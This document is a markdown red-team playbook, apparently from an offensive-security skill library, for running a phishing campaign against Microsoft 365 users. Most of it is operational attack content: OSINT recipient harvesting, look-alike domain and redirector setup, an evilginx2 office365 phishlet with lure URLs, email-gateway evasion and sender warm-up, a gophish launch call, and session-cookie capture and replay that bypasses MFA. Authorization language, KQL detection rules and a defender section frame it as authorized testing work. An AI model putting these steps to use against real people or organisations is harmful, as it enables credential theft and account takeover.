# Email Security Deep — End-to-End Campaign Operations Playbook

> Companion to `SKILL.md` and `payloads.md`. This guide walks through a full authorized phishing-campaign operation, phase by phase, from pretext design through clean exit. Every step assumes a signed Statement of Work that names the target recipients, sender identities, test window, and data-handling requirements. Unscoped phishing is a crime.

This playbook is the operational counterpart to the skill. Where `SKILL.md` is the reference (what's possible) and `payloads.md` is the catalogue (what to type), this playbook is the runbook (how to chain it together end-to-end).

---

## Table of Contents

1. [Phase 0 — Engagement Scoping & Authorization](#phase-0)
2. [Phase 1 — Pretext & Target Profiling](#phase-1)
3. [Phase 2 — Infrastructure Stand-up](#phase-2)
4. [Phase 3 — Gateway Evasion Tuning](#phase-3)
5. [Phase 4 — Payload Delivery](#phase-4)
6. [Phase 5 — AiTM / Click-Time](#phase-5)
7. [Phase 6 — Exfil & Clean Exit](#phase-6)
8. [Real-World Reproduction: EvilProxy Kill Chain](#evilproxy)
9. [Detection-and-Defense Counter-View](#defense-view)
10. [Common Failure Modes](#failures)
11. [Pre-Flight Checklist](#preflight)

---

<a name="phase-0"></a>
## Phase 0 — Engagement Scoping & Authorization

Before any infra is purchased, before any domain is registered, the engagement must be scoped in writing.

### Required SoW Elements

| Element | Why It Matters |
|---------|----------------|
| **Target recipients** (named individuals or named groups) | Defines who may receive campaign mail — prevents accidental contact with out-of-scope employees, contractors, customers |
| **Sender identities** (from-addresses, look-alike domains) | Defines what you may claim to be — typically limited to look-alikes or client-authorized subdomains, NOT real third parties |
| **Test window** (start/end timestamps) | Phishing infra running outside the window is unauthorized; emergency abort requires a clean kill switch |
| **Approved pivots** | AiTM only? Device-code phishing? OAuth consent? Post-exploitation depth? Each pivot is a separate scope decision |
| **Capture scope** | What may you capture (credentials? session cookies? host info?) — and what's forbidden (PII beyond auth?) |
| **Storage & destruction** | Where captured data lives, who can access it, when it's destroyed (typically engagement close + 30 days max) |
| **Emergency contact** | A named individual at the client who can authorize immediate shutdown if something goes wrong (real harm, accidental scope expansion, IR team escalates) |
| **Notification** | Will the client tell employees ahead of time? After? Never? Affects realism vs. organizational trust |

### Scoping Conversation Cheat-Sheet

```text
"We're going to test your organization's email gateway, your MFA posture, and
your user-click response rate. To do that we'll:

1. Send spearphishing mail to [named group] only, between [start] and [end].
2. Use look-alike domains [list] — registered in our name, not typosquats of
   your brand (we'll use clearly-fictional subdomains of [test.example] OR
   look-alikes of [third-party brand] you've approved).
3. Capture credentials and session cookies from recipients who click through.
   We'll store them [encrypted location], accessible only to [named team members],
   destroyed [date].
4. For recipients who complete MFA, we'll attempt session-cookie replay to
   access O365/Azure AD. We will NOT move laterally, modify data, or persist
   beyond [date] without your re-authorization.
5. For recipients who use FIDO2, we expect AiTM to fail. With your approval,
   we'll pivot to device-code flow phishing on [N named recipients] to test
   that compensating control.
6. Emergency abort: if you call [number], we kill all infra within 60 minutes."

If the client can't agree to all of these, the engagement isn't ready to start.
```

---

<a name="phase-1"></a>
## Phase 1 — Pretext & Target Profiling

### 1.1 OSINT Target List

Use OSINT skills (`skills/osint/`, `skills/recon-osint/`, `skills/social-engineering/`) to build the recipient list:

```bash
# theHarvester — email enumeration
theHarvester -d target.com -b all -f target-osint.json

# recon-ng
recon-ng
> marketplace install all
> db insert domains (select 'target.com')
> modules load recon/domains-contacts/hunter_io
> run

# LinkedIn scrape (with authorization) — name + title
# Combine with email-pattern inference (first.last@target.com)
```

### 1.2 Pretext Selection

Match pretext to recipient role and tech stack:

| Recipient Profile | Effective Pretext | Ineffective Pretext |
|--------------------|-------------------|----------------------|
| Engineer (technical) | "Your SSH key is expiring" / "GitHub PAT rotation required" / "PagerDuty escalation setup" | Generic "verify your account" |
| Executive | "Board document review" / "M&A confidential" / "Investor update" | "IT helpdesk password reset" |
| Finance | "Invoice requires approval" / "Wire confirmation" / "Vendor portal login" | "Reset your engineering access" |
| HR | "Candidate background check" / "Benefits portal" / "Compliance training" | "AWS root credential rotation" |
| Sales | "CRM lead assignment" / "Customer escalation" / "Salesforce login" | "DevOps incident response" |

### 1.3 Pretext Validation

Before campaign launch, validate the pretext against 1-2 internal reviewers:

```text
Reviewer questions:
1. Would you click this? Why or why not?
2. What's the give-away? (Spelling? URL? Brand mismatch?)
3. What would have made you click confidently?
4. If you clicked, would you complete the MFA prompt? Why or why not?
5. Does the timing make sense? (Would this arrive during work hours? Pre-weekend?)
```

### 1.4 Pretext Artifact Kit

- Email template (HTML + plain-text fallback) — see `payloads.md` Section 4.4
- Landing page HTML — see `payloads.md` Section 4.3
- Sender identity (from-address, reply-to)
- Subject line (with A/B variants for split-test)
- Send-time schedule (per-recipient timezone)

---

<a name="phase-2"></a>
## Phase 2 — Infrastructure Stand-up

### 2.1 Domain Registration

```bash
# Authorize only — never use typosquats of client's brand without explicit approval
# Preferred patterns:
#   <client-authorized-subdomain>.client.com (client provides DNS delegation)
#   <look-alike-of-third-party-brand>.com (e.g., micros0ft-security.com — verify trademark)
#   <clearly-fictional>.local + legitimate DNS

# Register through privacy-respecting registrar
# Configure DNS:
#   A record for landing host
#   MX record (if reply capture needed)
#   SPF aligned with sending IP
#   DKIM (1024+ bit; rotate per engagement)
#   DMARC aligned with SPF (p=none for warm-up; p=quarantine mid-campaign)
#   BIMI (optional — adds visible logo in some clients)
```

### 2.2 VPS Hardening

```bash
# Use a dedicated VPS (not shared) so your infra isn't co-mingled with others
# Harden:
apt update && apt upgrade -y
ufw default deny incoming
ufw allow 22/tcp        # SSH
ufw allow 80/tcp        # HTTP (Let's Encrypt + gophish landing)
ufw allow 443/tcp       # HTTPS (evilginx2 + gophish admin via reverse proxy)
ufw enable

# Disable password SSH
sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart ssh

# Fail2ban for SSH
apt install -y fail2ban
systemctl enable --now fail2ban
```

### 2.3 evilginx2 Deployment

```bash
# See payloads.md Section 1.1 for build instructions
sudo ./bin/evilginx -p phishlets -d

# Inside evilginx2 CLI:
config domain <phish-domain>
config ip <vps_public_ip>
phishlets hostname office365 login.<phish-domain>
phishlets enable office365
lures create office365
lures edit 0 path '/security-reset'
lures edit 0 redirect_url 'https://www.microsoft.com/'
lures get-url 0
```

### 2.4 gophish Deployment

```bash
# See payloads.md Section 4.1 for install
./gophish

# SSH tunnel for admin access (do not expose admin publicly)
ssh -L 3333:127.0.0.1:3333 user@vps

# In browser: https://localhost:3333 (ignore cert warning — internal tunnel)
# CHANGE default password immediately
# Generate API key for scripted use
```

### 2.5 Redirector Layer

```bash
# Caddy as redirector (masks true origin IP via Cloudflare-style DNS proxy)
:80, :443 {
  redir https://login.<phish-domain>{uri} 302
}

# Or: Cloudflare Workers
addEventListener('fetch', e => {
  e.respondWith(Response.redirect('https://login.<phish-domain>' + e.request.url, 302))
})
```

### 2.6 DNS/TLS Propagation Check

```bash
# Allow 5-15 min for DNS to propagate
dig +short login.<phish-domain>
openssl s_client -connect login.<phish-domain>:443 -servername login.<phish-domain> | openssl x509 -noout -subject -dates

# Both must return correct values before proceeding
```

---

<a name="phase-3"></a>
## Phase 3 — Gateway Evasion Tuning

### 3.1 Identify the Target's Gateway

```bash
# Send a probe mail and inspect received headers
swaks --to probe@target.com --from test@<phish-domain> --server mail.target.com --body probe

# Receive at probe mailbox; inspect headers:
#   X-Proofpoint-Spam-Details       → Proofpoint
#   X-Mimecast-*, X-MC-             → Mimecast
#   X-IronPort-*, X-ASG-            → Cisco ESA
#   X-MS-Exchange-Organization-*    → Microsoft Defender for Office
#   X-Spam-*, X-SpamPal             → Other (SpamAssassin, etc.)
```

### 3.2 Pre-Flight Each Detected Gateway

See `payloads.md` Sections 6-9 for per-gateway evasion techniques. For each gateway detected:

1. Identify the key control (URL rewriting, sandbox, sender reputation)
2. Test bypass techniques (delayed activation, encrypted-zip, HTML smuggling)
3. Measure delivery success rate (probe mail → inbox vs. spam vs. quarantine)

### 3.3 Sender Reputation Warm-up

```text
Day 1-2:     10 msgs/hr to internal test addresses
Day 3-5:     50 msgs/hr, ramp to 200/day
Day 6-9:     500 msgs/day, mix of senders
Day 10-14:   2000 msgs/day
Day 15+:     full campaign volume
```

During warm-up, monitor for:

- Blacklist listing (Spamhaus, SpamCop, Barracuda) — `payloads.md` Section 10.5
- Bounce rate (high bounce damages reputation)
- Spam-folder placement (test with multiple probe mailboxes)

### 3.4 Deliverability Test

```bash
# Use a deliverability test service (e.g., mail-tester.com)
# Send from look-alike to the test address; score should be 8+/10
# If lower, fix: SPF alignment, DKIM signature, content (avoid spam phrases), IP reputation
```

---

<a name="phase-4"></a>
## Phase 4 — Payload Delivery

### 4.1 Campaign Launch

```bash
# See payloads.md Section 4.6 for full API call
curl -k -X POST https://localhost:3333/api/campaigns/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -d '{
    "name": "Q2-redteam-001",
    "template": {"name": "urgent-password-reset"},
    "page": {"name": "office365-login"},
    "smtp": {"name": "microsoft-relay"},
    "groups": [{"name": "engineering-team"}],
    "launch_date": "2026-06-20T09:00:00Z"
  }'
```

### 4.2 Live Monitoring

```bash
# Tail gophish results
watch -n 60 'curl -k -s https://localhost:3333/api/campaigns/1/results?api_key=$KEY | jq ".stats"'

# Tail evilginx2 sessions (live captures)
sudo ./bin/evilginx -p phishlets -d -c 'sessions; exit'

# Tail beacon server logs
tail -f /var/log/nginx/access.log | grep -E '(beacon|click|open)'
```

### 4.3 Mid-Campaign Adjustments

If click-through is below threshold (< 5%), consider:

- Adjusting send-time (try 9-10 AM target local time)
- Adjusting subject line (A/B split)
- Adjusting sender identity (more or less authoritative)
- Adjusting landing page (faster load, mobile-rendering)

If click-through is above expected (> 30%), consider:

- Pause campaign — too-good results may indicate misconfiguration (mail delivered to wrong group, or client's training is suspended)
- Verify no out-of-scope recipients are receiving mail

---

<a name="phase-5"></a>
## Phase 5 — AiTM / Click-Time

### 5.1 Session Capture Flow

When a victim clicks through the lure URL:

1. Browser loads `https://login.<phish-domain>/security-reset?id=ABC123`
2. evilginx2 proxies to `https://login.microsoftonline.com/`
3. Victim sees real Microsoft login (now styled via your look-alike domain)
4. Victim submits username + password → evilginx2 captures, forwards to Microsoft
5. Microsoft prompts MFA → evilginx2 proxies prompt to victim
6. Victim completes MFA (TOTP / push / SMS) → evilginx2 captures MFA, forwards to Microsoft
7. Microsoft sets auth cookies → evilginx2 captures, returns proxied response to victim
8. evilginx2 records session in `sessions` table

### 5.2 Session Replay

```bash
# Inside evilginx2 CLI:
sessions 0
# Prints captured cookies for this session

# Copy cookies into browser via Cookie Quick Manager extension
# Navigate to https://www.office.com — should be logged in as victim
```

### 5.3 FIDO2 Detection & Pivot

If victim uses FIDO2 platform authenticator:

- FIDO2 assertion will fail (origin mismatch — `<phish-domain>` != `microsoftonline.com`)
- evilginx2 does NOT capture a usable session cookie
- Browser-side JS (Section 14.1 of payloads.md) detects FIDO2 presence, signals C2
- Per engagement scope: pivot to device-code flow phishing (TC-ED-012) or record as control strength

### 5.4 Conditional Access Reality Check

Even with a captured session cookie:

- If target tenant enforces "Compliant Device" CA → session replay from attacker's non-compliant device fails
- If target tenant enforces CAE (Continuous Access Evaluation) → session revoked when anomalous geo/IP detected
- If target tenant enforces "App Enforced Restrictions" → some app access requires additional step

Document each CA block as a control strength.

---

<a name="phase-6"></a>
## Phase 6 — Exfil & Clean Exit

### 6.1 Aggregate Captured Data

```bash
# Pull all evilginx2 sessions
sudo ./bin/evilginx -p phishlets -d -c 'sessions; exit' > sessions_dump.txt

# Pull all gophish results
curl -k -s https://localhost:3333/api/campaigns/1/results?api_key=$KEY > gophish_results.json

# Pull all beacon events
psql -d campaign -c 'select * from events order by ts' > beacon_events.csv
```

### 6.2 Funnel Report

```python
# Generate funnel report
import pandas as pd
events = pd.read_csv('beacon_events.csv')
gophish = pd.read_json('gophish_results.json')

funnel = {
  'sent': len(gophish),
  'delivered': (gophish['status'] == 'Sent').sum(),
  'opened': (events['event'] == 'open').nunique(),
  'clicked': (events['event'] == 'click').nunique(),
  'cred_captured': ...,
  'session_captured': ...,
  'fido2_blocked': ...,
}
pd.Series(funnel).to_csv('funnel_report.csv')
```

### 6.3 Evidence Destruction (per SoW)

```bash
# Destroy captured credentials/sessions
sudo ./bin/evilginx -p phishlets -d -c 'sessions delete all; exit'

# Wipe gophish database
sqlite3 /opt/gophish/gophish.db 'delete from results; delete from event_details;'

# Wipe beacon database
psql -d campaign -c 'truncate events;'

# Destroy any browser profiles used for session replay
rm -rf /root/.mozilla/firefox/replay-profile

# Document destruction in engagement report (timestamp + witness)
```

### 6.4 Infrastructure Teardown

```bash
# Disable evilginx2 phishlets
sudo ./bin/evilginx -p phishlets -d -c 'phishlets disable all; exit'

# Stop services
systemctl stop evilginx2 gophish nginx

# Revoke DNS (allow 24-48h for propagation)
# Delete DNS records at registrar

# Retire VPS (after evidence destruction verified)
# Document VPS retirement in engagement report
```

### 6.5 Final Report Contents

```markdown
# Q2 Red Team Phishing Campaign — Final Report

## Engagement Summary
- Window: 2026-06-20 09:00 UTC to 2026-06-22 17:00 UTC
- Recipients: 100 (engineering team)
- Sender identities: noreply@<phish-domain>

## Funnel Metrics
- Sent: 100
- Delivered to inbox: 92
- Opened: 47
- Clicked through: 18
- Credential submitted: 12
- MFA completed: 9
- Session captured (AiTM): 6
- FIDO2 blocked AiTM: 3
- Conditional Access blocked replay: 2 (of 6 attempted)
- Net successful account compromise: 4

## Control Strengths
1. FIDO2 deployment (3 of 9 MFA completers blocked AiTM entirely)
2. Conditional Access (2 of 6 captured sessions unusable from non-compliant device)
3. Defender Safe Links (rewrote 100% of URLs; click-time check denied 4 attempts)

## Control Weaknesses
1. 4 of 9 MFA completers used TOTP/push (FIDO2 rollout not uniform)
2. Encrypted-zip bypassed Safe Attachments (5 of 5 attempts)
3. Internal-spoofed senders bypassed Cisco ESA inbound scan (TC-ED-008 finding)

## Recommendations
1. Accelerate FIDO2 rollout — prioritize privileged roles
2. Mandate FIDO2 for all O365 access by [date]
3. Block encrypted archives by default
4. Enforce strict DMARC `p=reject` on legitimate domain
5. Quarterly review Tenant Allow/Block list
6. Train users on device-code phishing (FIDO2 doesn't prevent it)

## Evidence Handling
- All captured credentials/sessions destroyed on 2026-06-22 18:00 UTC
- Witness: [client name]
- Storage wiped and verified

## Infra Teardown
- Phishlets disabled: 2026-06-22 18:01 UTC
- gophish DB wiped: 2026-06-22 18:05 UTC
- DNS revoked: 2026-06-22 18:10 UTC
- VPS retired: 2026-06-22 18:30 UTC
```

---

<a name="evilproxy"></a>
## Real-World Reproduction: EvilProxy Kill Chain

EvilProxy (2022+) is a Phishing-as-a-Service platform built on evilginx2-style AiTM. Reproducing its kill chain in a lab validates detection rules.

### Lab Setup

```bash
# 1. Test O365 tenant (Microsoft 365 Developer Program — free dev tenant)
# 2. Three test users:
#    - user_totp (TOTP MFA)
#    - user_push (Microsoft Authenticator push)
#    - user_fido2 (Touch ID / Windows Hello FIDO2)
# 3. evilginx2 with O365 phishlet (per TC-ED-001)
# 4. Optional: Azure AD Conditional Access policy to test "compliant device"
```

### Run Campaign

```bash
# Per TC-ED-003 (TOTP), TC-ED-004 (push), TC-ED-005 (FIDO2)
# Run each test user through the lure URL; capture results

# Expected:
#   user_totp:   credential + session captured, replay succeeds
#   user_push:   credential + session captured, replay succeeds
#   user_fido2:  FIDO2 prompt fails through proxy, no session captured

# Then enable Conditional Access "require compliant device":
#   user_totp:   replay from non-compliant device FAILS
#   user_push:   replay from non-compliant device FAILS
#   user_fido2:  FIDO2 still blocks AiTM entirely
```

### Validate Detection Rules

```bash
# On the test tenant, sign-in logs should show:
#   - Successful sign-ins from evilginx2 VPS IP for user_totp, user_push
#   - Failed FIDO2 assertion for user_fido2 (origin mismatch)
#   - Session replay attempts from attacker IP (if CA not enabled)

# Detection rule (KQL):
SigninLogs
| where ClientAppUsed has "Browser"
| where IPAddress in ("<evilginx_vps_ip>", "<attacker_local_ip>")
| where TimeGenerated between (datetime(2026-06-20) .. datetime(2026-06-22))
| project TimeGenerated, UserPrincipalName, IPAddress, ClientAppUsed, ConditionalAccessStatus
```

---

<a name="defense-view"></a>
## Detection-and-Defense Counter-View

This playbook is offense-focused; the defender should think about each phase as a detection opportunity.

| Phase | Defender Detection Opportunity |
|-------|--------------------------------|
| Phase 0 (scope) | N/A (defender doesn't see attacker scope) |
| Phase 1 (OSINT/pretext) | Monitor LinkedIn scraping (rate limit + behavioral detection on corporate LinkedIn) |
| Phase 2 (infra) | **Certificate Transparency log monitoring** catches new TLS certs for look-alike domains at stand-up — earliest possible detection |
| Phase 2 (infra) | **Domain registration monitoring** (brand-protection services) catches typosquats at registration |
| Phase 3 (warm-up) | Sender reputation DBs (Talos, Spamhaus) flag new IPs at low volume — monitor your own gateway logs for new-IP inbound spikes |
| Phase 4 (delivery) | Email gateway logs — correlated opens + clicks from same victim in short window |
| Phase 5 (AiTM) | **Azure AD sign-in logs** — sign-ins from unexpected geo/IP, especially with `ClientAppUsed=Browser` and `IPAddress=<unknown-VPS>` |
| Phase 5 (AiTM) | **Impossible travel** detection — victim signs in from corporate office and VPS within minutes |
| Phase 5 (AiTM) | **CAE (Continuous Access Evaluation)** — continuous evaluation of session; revokes when risk detected |
| Phase 6 (exfil) | Impossible to detect externally — defender relies on prevention (Phases 2-5 detections) |

### The Single Strongest Defense: FIDO2

If the defender does one thing, it should be **FIDO2 platform authenticator rollout**.

- FIDO2 defeats evilginx2/modlishka AiTM entirely (origin-bound assertion)
- FIDO2 defeats session-cookie replay (attacker can't obtain a valid assertion)
- FIDO2 is phishing-resistant by design — no user training needed for efficacy
- Microsoft Authenticator (push/TOTP) and SMS are NOT phishing-resistant — accept them as transitional only

### The Second Strongest Defense: Conditional Access

- "Require compliant device" — session-cookie replay fails from non-managed device
- "Require MFA" with FIDO2 preferred — pushes users to strongest auth
- "Block legacy auth" — removes bypass paths via IMAP/SMTP
- "Sign-in risk policy" — auto-blocks high-risk sign-ins

---

<a name="failures"></a>
## Common Failure Modes

### Failure 1: TLS Cert Fails to Issue

**Symptom**: `openssl s_client` shows self-signed or no cert.

**Cause**: DNS not propagated; Let's Encrypt ACME challenge fails.

**Fix**: Wait 15 min after DNS change; re-run ACME; verify DNS via `dig +short login.<phish-domain>`.

### Failure 2: evilginx2 Phishlet Won't Enable

**Symptom**: `phishlets enable office365` returns error.

**Cause**: Missing `hostname` binding; cert not yet issued.

**Fix**: Run `phishlets hostname office365 login.<phish-domain>` BEFORE `enable`; verify cert issuance.

### Failure 3: gophish Mail Stuck in "Sending"

**Symptom**: Campaign status stuck; no mail delivered.

**Cause**: SMTP relay not authenticated; SPF/DKIM/DMARC misconfigured for sender; recipient gateway blocking.

**Fix**: Test SMTP via `swaks` first; check gophish logs (`logs/gophish.log`); verify sending profile via gophish "Send Test Email" UI.

### Failure 4: AiTM Captures Credentials but No Session

**Symptom**: `sessions` shows username/password but no auth tokens.

**Cause**: Phishlet's `auth_tokens` section is missing cookie names; or victim's MFA hasn't completed; or target service uses non-cookie session mechanism.

**Fix**: Capture legitimate auth flow with Burp; identify actual auth-token cookie names; update phishlet YAML.

### Failure 5: Session Replay Fails

**Symptom**: Captured cookies imported; target site still shows login page.

**Cause**: Cookie is device-bound (CAE); cookie expired; service uses additional device-fingerprint check.

**Fix**: This is a legitimate defensive block. Document as control strength; pivot to device-code flow if in scope.

### Failure 6: Out-of-Scope Recipient Receives Mail

**Symptom**: Campaign reached someone not on the authorized list.

**Cause**: Recipient group CSV contained extra rows; alias expansion at target; forwarded internally.

**Fix**: EMERGENCY ABORT. Trigger infra teardown immediately. Notify client emergency contact. Document in incident log. (This is why scoped groups must be reviewed line-by-line before launch.)

---

<a name="preflight"></a>
## Pre-Flight Checklist

Before launching the campaign, verify all of the following:

```text
[ ] SoW signed, includes all required elements (Phase 0 checklist)
[ ] Target list reviewed line-by-line; no out-of-scope recipients
[ ] Sender identity authorized
[ ] Look-alike domain DNS propagated (dig +short returns VPS IP)
[ ] TLS cert valid (openssl s_client shows valid cert)
[ ] evilginx2 operational; phishlet enabled; lure URL generated
[ ] gophish operational; admin password changed; API key generated
[ ] Sending profile configured (SMTP auth tested)
[ ] Email template loaded; landing page configured
[ ] Recipient group loaded
[ ] Gateway detected (Phase 3.1); evasion techniques tested
[ ] Sender IP warmed up (Phase 3.3); blacklist check clean
[ ] Deliverability test scored 8+/10
[ ] Beacon endpoints live (open, click, fido2)
[ ] Reporting database ready
[ ] Emergency abort contact reachable
[ ] Teardown procedure documented (Phase 6.4)
[ ] Evidence destruction procedure documented (Phase 6.3)

If any box is unchecked, DO NOT LAUNCH.
```

---

## Cross-References

- **`skills/email-protocol-attack/`** — Protocol-level SMTP/IMAP/Exchange abuse. This playbook's Phase 2 (sender reputation) builds on its SPF/DKIM/DMARC fundamentals.
- **`skills/social-engineering/`** — Human-psychology layer (pretext design, vishing, USB baiting). Phase 1 (pretext) leans on its OSINT and pretext-development techniques.
- **`skills/password-attack/`** — Post-campaign credential exploitation (hash cracking, password spraying).
- **`skills/cloud-identity-attack/`** — O365/Azure AD/Workspace identity attacks. AiTM-captured O365 sessions feed into this skill's cloud-identity post-exploitation.
- **`skills/web-auth-bypass/`** — Session/access-control abuse fundamentals.
- **`skills/payload-generation/`** — Payload craft for the attachment path.
- **`skills/av-edr-evasion/`** — Evasion once the payload runs.
- **`skills/osint/`** & **`skills/recon-osint/`** — OSINT for recipient enumeration (Phase 1).
- **`skills/engagement-manager/`** — Scoping, authorization, rules of engagement.

## External Resources

- evilginx2: [github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)
- evilgophish: [github.com/An0nUD4Y/evilgophish](https://github.com/An0nUD4Y/evilgophish)
- modlishka: [github.com/drk1wi/modlishka](https://github.com/drk1wi/modlishka)
- gophish: [getgophish.com](https://getgophish.com)
- King-Phisher: [github.com/rsmusllp/king-phisher](https://github.com/rsmusllp/king-phisher)
- ThePhish: [github.com/emalderson/ThePhish](https://github.com/emalderson/ThePhish)
- espoofer: [github.com/chenjj/espoofer](https://github.com/chenjj/espoofer)
- CISA AiTM advisories: [cisa.gov](https://www.cisa.gov)
- Microsoft Security Blog (AiTM, EvilProxy): [microsoft.com/en-us/security/blog](https://www.microsoft.com/en-us/security/blog)
- FIDO Alliance WebAuthn guidance: [fidoalliance.org/fido2](https://fidoalliance.org/fido2/)
- NIST SP 800-63B Authenticator Assurance Levels: [pages.nist.gov/800-63-3](https://pages.nist.gov/800-63-3/)
